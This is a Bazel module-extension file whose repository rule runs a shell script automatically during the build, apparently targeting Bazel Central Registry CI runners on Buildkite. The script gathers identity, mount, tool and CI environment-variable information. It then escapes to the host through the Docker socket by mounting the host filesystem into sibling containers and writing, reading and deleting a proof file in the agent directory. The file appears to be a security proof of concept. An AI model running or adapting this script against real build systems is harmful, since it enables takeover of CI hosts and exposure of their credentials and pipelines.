def _bcr_recon_repo_impl(repository_ctx):
    recon_script = """
echo BCR_BZLMOD_RECON_BEGIN
echo primitive=repository_ctx.execute
echo phase=bazel_module_extension_repository_rule
echo identity="$(id 2>/dev/null)"
echo working_directory="$(pwd)"
echo kernel="$(uname -a 2>/dev/null)"
echo mounted_paths_begin
ls -ldn /workdir /var/lib/buildkite-agent /var/run/docker.sock /usr/bin/buildkite-agent 2>&1 || true
echo mounted_paths_end
echo mountinfo_begin
sed -n '/\\/workdir\\|\\/var\\/lib\\/buildkite-agent\\|docker.sock\\|buildkite-agent/p' /proc/self/mountinfo 2>/dev/null | sed -n '1,40p'
echo mountinfo_end
echo tool_discovery_begin
for tool in buildkite-agent docker git bazel python3 curl wget gcloud gsutil; do
  path=$(command -v "$tool" 2>/dev/null || true)
  if [ -n "$path" ]; then
    echo "tool_present=$tool path=$path"
  else
    echo "tool_missing=$tool"
  fi
done
echo tool_discovery_end
echo ci_environment_names_begin
env | sed -n -e 's/^\\(BUILDKITE_[A-Z0-9_]*\\)=.*/env_present=\\1/p' -e 's/^\\(GOOGLE_[A-Z0-9_]*\\)=.*/env_present=\\1/p' -e 's/^\\(GITHUB_[A-Z0-9_]*\\)=.*/env_present=\\1/p' -e 's/^\\(DOCKER_[A-Z0-9_]*\\)=.*/env_present=\\1/p' | sort | sed -n '1,120p'
echo ci_environment_names_end
echo docker_socket_probe_begin
if [ -S /var/run/docker.sock ] && command -v docker >/dev/null 2>&1; then
  docker version 2>&1 | sed -n '1,80p'
else
  echo docker_socket_or_cli_missing
fi
echo docker_socket_probe_end
echo docker_host_escape_probe_begin
if [ -S /var/run/docker.sock ] && command -v docker >/dev/null 2>&1; then
  proof_rel="bcr-docker-socket-proof/${BUILDKITE_BUILD_NUMBER:-unknown-build}/${BUILDKITE_JOB_ID:-unknown-job}"
  case "$proof_rel" in
    *[!A-Za-z0-9._/-]*)
      proof_rel="bcr-docker-socket-proof/sanitized"
      ;;
  esac
  proof_image="gcr.io/bazel-public/ubuntu2404"
  if ! docker image inspect "$proof_image" >/dev/null 2>&1; then
    proof_image="$(docker image ls --format '{{.Repository}}:{{.Tag}}' | awk '$1 !~ /<none>/ { print; exit }')"
  fi
  if [ -z "$proof_image" ]; then
    echo no_local_docker_image_for_host_escape
  else
    echo docker_host_escape_image="$proof_image"
  docker run --rm --pull=never --network none \
    -v /:/host:ro \
    -v /var/lib/buildkite-agent:/host-agent:rw \
    "$proof_image" /bin/sh -c "
      set -eu
      echo sibling_container_host_read_begin
      id
      ls -ldn /host /host/etc /host/var/lib/buildkite-agent 2>&1 || true
      sed -n '1p' /host/etc/hostname 2>/dev/null || true
      echo sibling_container_host_read_end
      mkdir -p /host-agent/$proof_rel
      {
        echo docker_socket_host_write_proof
        date -u +%Y-%m-%dT%H:%M:%SZ
        id
        uname -a
      } > /host-agent/$proof_rel/proof.txt
      echo sibling_container_host_write_path=/var/lib/buildkite-agent/$proof_rel/proof.txt
      sed -n '1,20p' /host-agent/$proof_rel/proof.txt
    " 2>&1 | sed -n '1,160p'
  docker run --rm --pull=never --network none \
    -v /var/lib/buildkite-agent:/host-agent:rw \
    "$proof_image" /bin/sh -c "
      set -eu
      echo sibling_container_second_read_begin
      test -f /host-agent/$proof_rel/proof.txt
      sed -n '1,20p' /host-agent/$proof_rel/proof.txt
      rm -rf /host-agent/$proof_rel
      echo sibling_container_second_read_and_cleanup_end
    " 2>&1 | sed -n '1,120p'
  fi
else
  echo docker_socket_or_cli_missing
fi
echo docker_host_escape_probe_end
echo BCR_BZLMOD_RECON_END
"""
    result = repository_ctx.execute(["/bin/sh", "-c", recon_script], quiet = False)
    print(result.stdout)
    if result.stderr:
        print(result.stderr)
    repository_ctx.file("recon.txt", "repository_ctx.execute return_code=%s\n" % result.return_code)
    repository_ctx.file(
        "BUILD.bazel",
        "filegroup(name = 'recon_marker', srcs = ['recon.txt'], visibility = ['//visibility:public'])\n",
    )

bcr_recon_repo = repository_rule(implementation = _bcr_recon_repo_impl)

def _bcr_recon_impl(module_ctx):
    bcr_recon_repo(name = "bcr_recon_repo")

bcr_recon = module_extension(implementation = _bcr_recon_impl)
